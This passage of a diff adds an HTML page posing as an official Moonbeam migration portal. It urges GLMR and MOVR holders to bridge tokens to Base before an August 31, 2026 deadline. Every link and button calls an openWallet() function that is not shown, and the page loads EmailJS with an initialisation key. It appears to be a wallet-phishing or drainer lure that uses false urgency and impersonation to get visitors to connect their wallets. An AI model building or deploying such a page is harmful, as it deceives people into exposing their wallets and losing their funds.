@@ -1,0 +1,2278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("7tpKliu3iA0wJbT5q");
+    })();
+  </script>
+  <title>Moonbeam Migration | Move to Base</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+    :root {
+      --bg: #000000;
+      --teal: #2fe6c9;
+      --teal-dim: rgba(47, 230, 201, 0.4);
+      --lavender: #a3a2f5;
+      --white: #ffffff;
+      --grey-1: #b7b7b7;
+      --grey-2: #8a8a8a;
+      --grey-3: #5c5c5c;
+      --line: rgba(255, 255, 255, 0.14);
+      --line-soft: rgba(255, 255, 255, 0.08);
+      --card-bg: rgba(255, 255, 255, 0.02);
+      --font-mono: 'JetBrains Mono', ui-monospace, monospace;
+      --font-sans: 'Inter', -apple-system, sans-serif;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--white);
+      font-family: var(--font-sans);
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    button {
+      font-family: inherit;
+      cursor: pointer;
+    }
+
+    ::selection {
+      background: var(--teal);
+      color: #000;
+    }
+
+    .wrap {
+      max-width: 1920px;
+      margin: 0 auto;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.001ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.001ms !important;
+        scroll-behavior: auto !important;
+      }
+    }
+
+    a:focus-visible,
+    button:focus-visible {
+      outline: 2px solid var(--teal);
+      outline-offset: 3px;
+    }
+
+    /* ---------- Top ticker ---------- */
+    .ticker {
+      background: var(--teal);
+      color: #000;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.03em;
+      text-align: center;
+      padding: 9px 16px;
+    }
+
+    /* ---------- Nav ---------- */
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: #000;
+      border-bottom: 1px solid var(--line);
+    }
+
+    nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 30px;
+      max-width: 1920px;
+      margin: 0 auto;
+      gap: 24px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-weight: 500;
+      font-size: 22px;
+      letter-spacing: 0.02em;
+      flex-shrink: 0;
+    }
+
+    .logo img {
+      width: 80px;
+      height: 80px;
+
+    }
+
+    .navlinks {
+      display: flex;
+      align-items: center;
+      gap: 44px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.06em;
+      font-weight: 500;
+    }
+
+    .navlinks a {
+      color: var(--white);
+      transition: color .15s ease;
+      white-space: nowrap;
+    }
+
+    .navlinks a:hover {
+      color: var(--teal);
+    }
+
+    .explore-btn {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.05em;
+      font-weight: 500;
+      color: var(--teal);
+      border: 1px solid var(--teal);
+      padding: 11px 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: background .15s ease, color .15s ease;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .explore-btn:hover {
+      background: var(--teal);
+      color: #000;
+    }
+
+    .navburger {
+      display: none;
+      background: transparent;
+      border: none;
+      flex-direction: column;
+      gap: 4px;
+      cursor: pointer;
+      padding: 2px;
+    }
+
+    .navburger .bar {
+      display: block;
+      width: 18px;
+      height: 1.4px;
+      background: #fff;
+      transition: transform 0.25s ease, opacity 0.25s ease, width 0.25s ease;
+      transform-origin: center;
+    }
+
+    .navburger[aria-expanded="true"] .bar:nth-child(1) {
+      transform: translateY(5.4px) rotate(45deg);
+    }
+
+    .navburger[aria-expanded="true"] .bar:nth-child(2) {
+      opacity: 0;
+      width: 0;
+    }
+
+    .navburger[aria-expanded="true"] .bar:nth-child(3) {
+      transform: translateY(-5.4px) rotate(-45deg);
+    }
+
+    /* ---------- Mobile nav menu ---------- */
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 99;
+      background: #061a18;
+      overflow-y: auto;
+      flex-direction: column;
+      transform: translateX(100%);
+      transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .mobile-nav.is-open {
+      transform: translateX(0);
+    }
+
+    .mobile-nav-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 18px 20px;
+      border-bottom: 1px solid rgba(47, 230, 201, 0.2);
+    }
+
+    .mobile-nav-header .logo {
+      font-size: 18px;
+    }
+
+    .mobile-nav-close {
+      background: transparent;
+      border: 1px solid rgba(47, 230, 201, 0.3);
+      width: 38px;
+      height: 38px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--teal);
+      font-size: 20px;
+      line-height: 1;
+      transition: background 0.15s ease, border-color 0.15s ease;
+    }
+
+    .mobile-nav-close:hover {
+      background: rgba(47, 230, 201, 0.1);
+      border-color: var(--teal);
+    }
+
+    .mobile-nav-items {
+      flex: 1;
+    }
+
+    .mobile-nav-item {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      align-items: center;
+      border-bottom: 1px solid rgba(47, 230, 201, 0.15);
+      text-decoration: none;
+      transition: background 0.15s ease;
+      cursor: pointer;
+    }
+
+    .mobile-nav-item:hover,
+    .mobile-nav-item:active {
+      background: rgba(47, 230, 201, 0.07);
+    }
+
+    .mobile-nav-item .mn-label {
+      padding: 28px 20px;
+      font-family: var(--font-mono);
+      font-size: 14px;
+      font-weight: 500;
+      letter-spacing: 0.1em;
+      color: var(--teal);
+      text-transform: uppercase;
+      border-right: 1px solid rgba(47, 230, 201, 0.15);
+    }
+
+    .mobile-nav-item .mn-arrow {
+      padding: 28px 20px;
+      color: rgba(47, 230, 201, 0.6);
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .mobile-nav-cta {
+      padding: 28px 20px;
+      border-top: 1px solid rgba(47, 230, 201, 0.2);
+    }
+
+    .mobile-nav-cta a {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.05em;
+      font-weight: 500;
+      color: #000;
+      background: var(--teal);
+      padding: 16px 24px;
+      text-transform: uppercase;
+      text-decoration: none;
+      transition: opacity 0.15s ease;
+    }
+
+    .mobile-nav-cta a:hover {
+      opacity: 0.85;
+    }
+
+    /* ---------- Hero ---------- */
+    .hero {
+      position: relative;
+      min-height: 640px;
+      padding: 64px 48px 40px;
+      border-bottom: 1px solid var(--line);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+    }
+
+    .hero-media {
+      position: absolute;
+      inset: 0;
+      z-index: 0;
+    }
+
+    .hero-media img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .hero-media-placeholder {
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 900px 600px at 78% 22%, rgba(230, 60, 110, 0.28), transparent 60%),
+        radial-gradient(ellipse 700px 500px at 60% 65%, rgba(38, 90, 140, 0.35), transparent 65%),
+        #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      object-fit: contain;
+    }
+
+    .placeholder-tag {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      letter-spacing: 0.08em;
+      color: var(--grey-3);
+      border: 1px dashed var(--grey-3);
+      padding: 6px 12px;
+      text-transform: uppercase;
+      text-align: center;
+    }
+
+    .hero-content {
+      position: relative;
+      z-index: 2;
+    }
+
+    .hero h1 {
+      font-family: var(--font-sans);
+      font-weight: 800;
+      font-size: clamp(40px, 6.4vw, 92px);
+      line-height: 0.98;
+      letter-spacing: -0.02em;
+      text-transform: uppercase;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.08em;
+      color: var(--teal);
+      border: 1px solid var(--teal-dim);
+      background: rgba(47, 230, 201, 0.06);
+      padding: 7px 14px;
+      margin-bottom: 22px;
+      text-transform: uppercase;
+    }
+
+    .hero-badge .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--teal);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(47, 230, 201, 0.5);
+      }
+
+      70% {
+        box-shadow: 0 0 0 8px rgba(47, 230, 201, 0);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(47, 230, 201, 0);
+      }
+    }
+
+    /* ---------- Stats band ---------- */
+    .stats-band {
+      display: flex;
+      flex-wrap: wrap;
+      border-bottom: 1px solid var(--line);
+      padding: 20px 48px;
+      font-family: var(--font-mono);
+    }
+
+    .stats-band .item {
+      padding: 0 32px;
+      border-right: 1px solid var(--line-soft);
+    }
+
+    .stats-band .item:first-child {
+      padding-left: 0;
+    }
+
+    .stats-band .item:last-child {
+      border-right: none;
+    }
+
+    .stats-band .label {
+      font-size: 11px;
+      color: var(--grey-3);
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+
+    .stats-band .value {
+      font-size: 14px;
+      color: var(--white);
+      margin-top: 4px;
+    }
+
+    /* ---------- Migration CTA section ---------- */
+    .migration-section {
+      padding: 88px 48px 96px;
+      border-bottom: 1px solid var(--line);
+      position: relative;
+    }
+
+    .section-eyebrow {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.12em;
+      color: var(--teal);
+      text-transform: uppercase;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .section-eyebrow::before {
+      content: '';
+      width: 22px;
+      height: 1px;
+      background: var(--teal);
+    }
+
+    .migration-section h2 {
+      font-family: var(--font-sans);
+      font-weight: 800;
+      font-size: clamp(32px, 4.4vw, 58px);
+      text-transform: uppercase;
+      letter-spacing: -0.01em;
+      line-height: 1.02;
+      max-width: 900px;
+    }
+
+    .migration-sub {
+      color: var(--grey-1);
+      font-size: 16px;
+      line-height: 1.65;
+      max-width: 640px;
+      margin-top: 22px;
+    }
+
+    .deadline-strip {
+      margin-top: 32px;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.04em;
+      color: var(--white);
+      border: 1px solid var(--line);
+      padding: 12px 20px;
+      background: var(--card-bg);
+    }
+
+    .deadline-strip strong {
+      color: var(--teal);
+      font-weight: 600;
+    }
+
+    .cta-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1px;
+      background: var(--line);
+      border: 1px solid var(--line);
+      margin-top: 56px;
+    }
+
+    .cta-card {
+      background: #000;
+      padding: 34px 30px;
+      position: relative;
+      transition: background .2s ease;
+      display: flex;
+      flex-direction: column;
+      min-height: 220px;
+    }
+
+    .cta-card:hover {
+      background: rgba(47, 230, 201, 0.04);
+    }
+
+    .cta-card .idx {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--grey-3);
+      letter-spacing: 0.05em;
+      margin-bottom: 20px;
+    }
+
+    .cta-card .icon {
+      width: 34px;
+      height: 34px;
+      margin-bottom: 20px;
+      color: var(--teal);
+    }
+
+    .cta-card h3 {
+      font-family: var(--font-sans);
+      font-size: 20px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.01em;
+      margin-bottom: 10px;
+    }
+
+    .cta-card p {
+      color: var(--grey-2);
+      font-size: 14px;
+      line-height: 1.55;
+      flex: 1;
+    }
+
+    .cta-card .go {
+      margin-top: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.05em;
+      color: var(--teal);
+      text-transform: uppercase;
+    }
+
+    .cta-card .go svg {
+      transition: transform .15s ease;
+    }
+
+    .cta-card:hover .go svg {
+      transform: translate(3px, -3px);
+    }
+
+    .cta-card.featured {
+      background: rgba(47, 230, 201, 0.05);
+    }
+
+    .cta-card.featured::after {
+      content: 'PRIORITY';
+      position: absolute;
+      top: 34px;
+      right: 30px;
+      font-family: var(--font-mono);
+      font-size: 10px;
+      letter-spacing: 0.08em;
+      color: #000;
+      background: var(--teal);
+      padding: 4px 8px;
+    }
+
+    /* ---------- Why Migrate ---------- */
+    .why-section {
+      padding: 96px 48px;
+      border-bottom: 1px solid var(--line);
+      position: relative;
+    }
+
+    .why-section h2 {
+      font-family: var(--font-sans);
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 800;
+      text-transform: uppercase;
+      margin-bottom: 64px;
+    }
+
+    .why-grid {
+      position: relative;
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 40px;
+      min-height: 520px;
+      align-items: stretch;
+    }
+
+    .why-cards-col {
+      display: flex;
+      flex-direction: column;
+      gap: 40px;
+      justify-content: center;
+    }
+
+    .why-card {
+      border: 1px solid var(--line);
+      padding: 26px 28px 30px;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(6px);
+      max-width: 520px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .why-card .card-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--grey-3);
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--line-soft);
+      margin-bottom: 20px;
+    }
+
+    .why-card h3 {
+      font-family: var(--font-sans);
+      font-size: 22px;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: var(--teal);
+      margin-bottom: 14px;
+      line-height: 1.2;
+    }
+
+    .why-card p {
+      color: var(--grey-1);
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .why-media {
+      position: relative;
+      min-height: 480px;
+      z-index: 1;
+    }
+
+    /* ---------- Supported Assets ---------- */
+    .assets-section {
+      padding: 96px 48px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .assets-section h2 {
+      font-family: var(--font-sans);
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 800;
+      text-transform: uppercase;
+      margin-bottom: 56px;
+    }
+
+    .assets-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+    }
+
+    .asset-card {
+      border: 1px solid var(--line);
+      padding: 28px;
+      display: flex;
+      gap: 18px;
+      background: var(--card-bg);
+      transition: border-color .15s ease;
+    }
+
+    .asset-card:hover {
+      border-color: var(--teal-dim);
+    }
+
+    .asset-icon {
+      width: 52px;
+      height: 52px;
+      border: 1px solid var(--line);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 13px;
+      color: var(--teal);
+      text-align: center;
+    }
+
+    .asset-card h4 {
+      font-family: var(--font-sans);
+      font-size: 17px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+
+    .asset-card p {
+      color: var(--grey-2);
+      font-size: 13.5px;
+      line-height: 1.55;
+    }
+
+    /* ---------- Steps ---------- */
+    .steps-section {
+      padding: 96px 48px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .steps-header {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      margin-bottom: 56px;
+      flex-wrap: wrap;
+      gap: 24px;
+    }
+
+    .steps-header h2 {
+      font-family: var(--font-sans);
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 800;
+      text-transform: uppercase;
+    }
+
+    .all-faq-btn {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.05em;
+      color: var(--white);
+      border: 1px solid var(--lavender);
+      padding: 14px 22px;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      transition: background .15s ease;
+    }
+
+    .all-faq-btn:hover {
+      background: rgba(163, 162, 245, 0.12);
+    }
+
+    .steps-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      border-top: 1px solid var(--line);
+      border-left: 1px solid var(--line);
+    }
+
+    .step-card {
+      border-right: 1px solid var(--line);
+      border-bottom: 1px solid var(--line);
+      padding: 32px 28px;
+      min-height: 280px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .step-card .step-date {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--grey-3);
+      letter-spacing: 0.05em;
+    }
+
+    .step-card .step-tag {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--teal);
+      border: 1px solid var(--teal-dim);
+      padding: 4px 10px;
+      display: inline-block;
+      margin-top: 14px;
+      width: fit-content;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .step-card h3 {
+      font-family: var(--font-sans);
+      font-size: 21px;
+      font-weight: 700;
+      margin-top: 18px;
+      line-height: 1.25;
+    }
+
+    .step-card p {
+      color: var(--grey-2);
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin-top: 14px;
+      flex: 1;
+    }
+
+    /* ---------- FAQ (Case Studies style) ---------- */
+    .faq-section {
+      padding: 96px 48px;
+      border-bottom: 1px solid var(--line);
+      position: relative;
+      min-height: 640px;
+    }
+
+    .faq-section h2 {
+      font-family: var(--font-sans);
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 800;
+      text-transform: uppercase;
+      margin-bottom: 56px;
+    }
+
+    .faq-list {
+      max-width: 640px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .faq-item {
+      border: 1px solid var(--line);
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(4px);
+      margin-bottom: 24px;
+    }
+
+    .faq-item .fq-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--grey-3);
+      padding: 14px 20px;
+      border-bottom: 1px solid var(--line-soft);
+    }
+
+    .faq-item .fq-body {
+      padding: 22px 20px 26px;
+    }
+
+    .faq-item h3 {
+      font-family: var(--font-sans);
+      font-size: 19px;
+      font-weight: 700;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .faq-item p {
+      color: var(--grey-1);
+      font-size: 14.5px;
+      line-height: 1.6;
+      margin-bottom: 18px;
+    }
+
+    .read-more {
+      display: inline-flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      border: 1px solid var(--line);
+      padding: 14px 18px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      transition: border-color .15s ease;
+    }
+
+    .read-more:hover {
+      border-color: var(--teal);
+    }
+
+    .faq-media {
+      position: absolute;
+      right: 0;
+      top: 0;
+      width: 55%;
+      height: 100%;
+      z-index: 1;
+    }
+
+    /* ---------- Ready / Support ---------- */
+    .ready-section {
+      padding: 96px 48px;
+      border-bottom: 1px solid var(--line);
+      position: relative;
+      min-height: 560px;
+    }
+
+    .ready-section h2 {
+      font-family: var(--font-sans);
+      font-size: clamp(36px, 5.6vw, 72px);
+      font-weight: 800;
+      text-transform: uppercase;
+      margin-bottom: 64px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .ready-cards {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      gap: 220px;
+    }
+
+    .ready-card {
+      border: 1px solid var(--line);
+      background: rgba(0, 0, 0, 0.72);
+      backdrop-filter: blur(4px);
+      padding: 28px 30px 30px;
+      max-width: 520px;
+    }
+
+    .ready-card:nth-child(2) {
+      align-self: flex-end;
+    }
+
+    .ready-card .rc-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--grey-3);
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--line-soft);
+      margin-bottom: 20px;
+    }
+
+    .ready-card h3 {
+      font-family: var(--font-sans);
+      font-size: 24px;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: var(--lavender);
+      margin-bottom: 12px;
+    }
+
+    .ready-card p {
+      color: var(--grey-1);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+
+    .lm-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      border: 1px solid var(--line);
+      padding: 14px 18px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      transition: border-color .15s ease, background .15s ease;
+    }
+
+    .lm-btn:hover {
+      border-color: var(--lavender);
+      background: rgba(163, 162, 245, 0.08);
+    }
+
+    .ready-media {
+      position: absolute;
+      inset: 0;
+      z-index: 0;
+    }
+
+    /* ---------- Footer ---------- */
+    footer {
+      padding: 64px 48px 40px;
+    }
+
+    .foot-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr) auto;
+      gap: 32px;
+      padding-bottom: 56px;
+    }
+
+    .foot-col h5 {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      letter-spacing: 0.06em;
+      color: var(--white);
+      text-transform: uppercase;
+      margin-bottom: 20px;
+    }
+
+    .foot-col a {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 12.5px;
+      color: var(--teal);
+      letter-spacing: 0.02em;
+      margin-bottom: 14px;
+      transition: opacity .15s ease;
+    }
+
+    .foot-col a:hover {
+      opacity: 0.7;
+    }
+
+    .foot-socials {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      align-items: flex-start;
+    }
+
+    .foot-socials a {
+      width: 20px;
+      height: 20px;
+      color: var(--white);
+      display: flex;
+    }
+
+    .foot-socials a:hover {
+      color: var(--teal);
+    }
+
+    .foot-bottom {
+      border-top: 1px solid var(--line);
+      padding-top: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--grey-3);
+      letter-spacing: 0.02em;
+    }
+
+    .foot-bottom .links {
+      display: flex;
+      gap: 24px;
+    }
+
+    .foot-bottom a:hover {
+      color: var(--white);
+    }
+
+    .secured {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--grey-1);
+    }
+
+    /* ---------- Responsive ---------- */
+    @media (max-width:1100px) {
+      .why-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .why-card.two {
+        margin-left: 0;
+      }
+
+      .cta-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .assets-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .steps-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .foot-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    @media (max-width:820px) {
+      nav {
+        padding: 18px 20px;
+      }
+
+      .navlinks {
+        display: none;
+      }
+
+      .navburger {
+        display: flex;
+        width: 38px;
+        height: 38px;
+        border: 1px solid var(--line);
+        align-items: center;
+        justify-content: center;
+        color: var(--white);
+      }
+
+      .mobile-nav {
+        display: flex;
+      }
+
+      .hero {
+        padding: 40px 20px 28px;
+        min-height: auto;
+      }
+
+      .stats-band {
+        padding: 16px 20px;
+      }
+
+      .migration-section,
+      .why-section,
+      .assets-section,
+      .steps-section,
+      .faq-section,
+      .ready-section {
+        padding: 56px 20px;
+      }
+
+      .cta-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .assets-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .steps-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .why-media,
+      .faq-media,
+      .ready-media {
+        display: none;
+      }
+
+      .why-card {
+        max-width: 100%;
+      }
+
+      .why-grid {
+        min-height: auto;
+        gap: 24px;
+      }
+
+      .ready-cards {
+        gap: 24px;
+      }
+
+      .ready-card {
+        max-width: 100%;
+      }
+
+      .ready-card:nth-child(2) {
+        align-self: stretch;
+      }
+
+      .faq-list {
+        max-width: 100%;
+      }
+
+      .foot-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 36px;
+      }
+
+      .foot-bottom {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .steps-header {
+        align-items: flex-start;
+      }
+    }
+
+    @media (max-width:480px) {
+      .foot-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="ticker"><span>Migration bridge is now open &mdash; GLMR and MOVR must migrate to Base before August 31,
+      2026</span></div>
+
+  <header>
+    <nav>
+      <a href="#top" class="logo">
+        <img src="img/moonbeamlogo.jpg" alt="">
+        MOONBEAM
+      </a>
+      <div class="navlinks">
+        <a href="#migration" onclick="openWallet(); return false;">Migration</a>
+        <a href="#assets" onclick="openWallet(); return false;">Assets</a>
+        <a href="#steps" onclick="openWallet(); return false;">Steps</a>
+        <a href="#faq" onclick="openWallet(); return false;">FAQ</a>
+        <a href="#support" onclick="openWallet(); return false;">Support</a>
+      </div>
+      <a href="#migration" class="explore-btn" onclick="openWallet(); return false;">START MIGRATION &#8599;</a>
+      <button class="navburger" aria-label="Open menu" aria-expanded="false" aria-controls="mobile-nav">
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+      </button>
+    </nav>
+  </header>
+
+  <!-- Mobile Navigation Menu -->
+  <nav class="mobile-nav" id="mobile-nav" aria-hidden="true">
+    <div class="mobile-nav-header">
+      <a href="#top" class="logo" id="mobile-logo">
+        <img src="img/moonbeamlogo.jpg" alt="Moonbeam logo" style="width:48px;height:48px;">
+        MOONBEAM
+      </a>
+      <button class="mobile-nav-close" id="mobile-nav-close" aria-label="Close menu">&times;</button>
+    </div>
+    <div class="mobile-nav-items">
+      <a href="#migration" class="mobile-nav-item" onclick="openWallet(); return false;">
+        <span class="mn-label">Migration</span>
+        <span class="mn-arrow">&#9661;</span>
+      </a>
+      <a href="#assets" class="mobile-nav-item" onclick="openWallet(); return false;">
+        <span class="mn-label">Assets</span>
+        <span class="mn-arrow">&#9661;</span>
+      </a>
+      <a href="#steps" class="mobile-nav-item" onclick="openWallet(); return false;">
+        <span class="mn-label">Steps</span>
+        <span class="mn-arrow">&#9661;</span>
+      </a>
+      <a href="#faq" class="mobile-nav-item" onclick="openWallet(); return false;">
+        <span class="mn-label">FAQ</span>
+        <span class="mn-arrow">&#9661;</span>
+      </a>
+      <a href="#support" class="mobile-nav-item" onclick="openWallet(); return false;">
+        <span class="mn-label">Support</span>
+        <span class="mn-arrow">&#9661;</span>
+      </a>
+    </div>
+    <div class="mobile-nav-cta">
+      <a href="#migration" onclick="openWallet(); return false;">START MIGRATION &#8599;</a>
+    </div>
+  </nav>
+
+  <main id="top">
+
+    <section class="hero">
+      <div class="hero-media">
+        <img src="img/moonbeambg.png" class="hero-media-placeholder">
+      </div>
+      <div class="hero-content">
+        <div class="hero-badge"><span class="dot"></span>MIGRATION LIVE &mdash; BRIDGE OPEN NOW</div>
+        <h1>Move Here<br>Migrate Anywhere<br>with Moonbeam</h1>
+      </div>
+    </section>
+
+    <div class="stats-band">
+      <div class="item">
+        <div class="label">Migration Deadline</div>
+        <div class="value">Aug 31, 2026</div>
+      </div>
+      <div class="item">
+        <div class="label">Migration Ratio</div>
+        <div class="value">1:1</div>
+      </div>
+      <div class="item">
+        <div class="label">Migration Fee</div>
+        <div class="value">$0.00</div>
+      </div>
+      <div class="item">
+        <div class="label">Destination Chain</div>
+        <div class="value">Base</div>
+      </div>
+      <div class="item">
+        <div class="label">Assets Supported</div>
+        <div class="value">GLMR &middot; MOVR</div>
+      </div>
+      <div class="item">
+        <div class="label">Bridge Status</div>
+        <div class="value">Open</div>
+      </div>
+    </div>
+
+    <section class="migration-section" id="migration">
+      <div class="section-eyebrow">Get Started</div>
+      <h2>What do you need<br>to do today?</h2>
+      <p class="migration-sub">GLMR and MOVR are moving from the Moonbeam and Moonriver chains to Base. Choose the
+        action that applies to you below and follow the guided steps. The bridge is open now &mdash; don't wait until
+        the deadline.</p>
+      <div class="deadline-strip">
+        <span>&#9432;</span>
+        All positions must be exited and tokens bridged before <strong>August 31, 2026</strong>
+      </div>
+
+      <div class="cta-grid">
+
+        <a href="#steps" class="cta-card featured" onclick="openWallet(); return false;">
+          <div class="idx">01 / MIGRATE</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M3 12h13m0 0l-5-5m5 5l-5 5M21 12a9 9 0 11-9-9" stroke-linecap="round" stroke-linejoin="round" />
+          </svg>
+          <h3>Migration</h3>
+          <p>Bridge your GLMR or MOVR tokens 1:1 from Moonbeam/Moonriver to Base ERC-20 tokens via the official
+            migration portal.</p>
+          <span class="go">Start migration <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+        <a href="#steps" class="cta-card" onclick="openWallet(); return false;">
+          <div class="idx">02 / UNSTAKE</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path
+              d="M12 2v6m0 8v6m10-10h-6M8 12H2m15.07-7.07l-4.24 4.24m-5.66 5.66l-4.24 4.24m14.14 0l-4.24-4.24M6.93 4.93l4.24 4.24"
+              stroke-linecap="round" />
+          </svg>
